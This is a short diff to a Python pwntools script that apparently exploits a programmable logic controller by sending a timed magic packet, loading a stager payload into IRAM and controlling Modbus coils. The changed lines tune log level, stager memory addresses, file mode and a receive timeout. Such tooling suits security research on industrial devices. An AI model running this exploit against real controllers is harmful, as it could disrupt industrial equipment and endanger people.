@@ -16,7 +16,7 @@ import argparse
 from binascii import hexlify
 
 from pwn import remote,context,log,xor
-context.update(log_level="debug", bits=32, endian="big")
+context.update(log_level="info", bits=32, endian="big")
 
 
 
@@ -50,10 +50,10 @@ DEFAULT_STAGER_ADDHOOK_IND = 0x20
 # For installing an additional hook, we also assign a default index
 DEFAULT_SECOND_ADD_HOOK_IND = 0x1a
 
-#IRAM_STAGER_START = 0x1003AD00
-#IRAM_STAGER_END = 0x10040000
-IRAM_STAGER_START = 0x10030100
-IRAM_STAGER_END = 0x100303FC
+IRAM_STAGER_START = 0x1003AD00
+IRAM_STAGER_END = 0x10040000
+#IRAM_STAGER_START = 0x10030100
+#RAM_STAGER_END = 0x100303FC
 #IRAM_STAGER_START = 0x10010000
 #IRAM_STAGER_END = 0x10020000
 IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START
@@ -582,7 +582,7 @@ def main():
     ps_modbus_group.add_argument('--ps-modbus-coil', dest='ps_modbus_coil', default=0, type=int,
                         help='Modbus coil address (0-indexed) to control (default: 0).')
 
-    parser.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME,
+    parser.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=STAGER_PL_FILENAME,
                         help='the location of the stager payload')
     parser.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution after action completed")
     parser.add_argument('-e', '--extra', default="", dest='extra', nargs='+', help="Additional arguments for custom logic")
@@ -667,7 +667,7 @@ def main():
         # We have 500000 microseconds (half a second) to hit the timing
         s.send(pad + magic)
 
-        answ = s.recv(256, timeout=0.3)
+        answ = s.recv(256, timeout=0.2)
         if len(answ) > 0:
             if not answ.startswith("\5-CPU"):
                 answ += s.recv(256)
